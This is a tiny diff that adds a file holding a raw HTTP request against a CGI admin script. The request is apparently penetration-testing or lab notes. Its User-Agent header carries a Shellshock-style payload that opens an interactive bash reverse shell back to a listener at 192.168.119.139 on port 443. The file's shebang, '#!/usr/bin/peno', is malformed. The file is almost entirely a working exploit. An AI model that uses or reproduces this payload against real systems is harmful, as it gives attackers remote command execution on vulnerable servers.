@@ -1,0 +1,6 @@
+#!/usr/bin/peno
+
+#Example
+GET /cgi-bin/admin.cgi HTTP/1.1
+Host: 10.11.1.71
+User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.119.139/443 0>&1
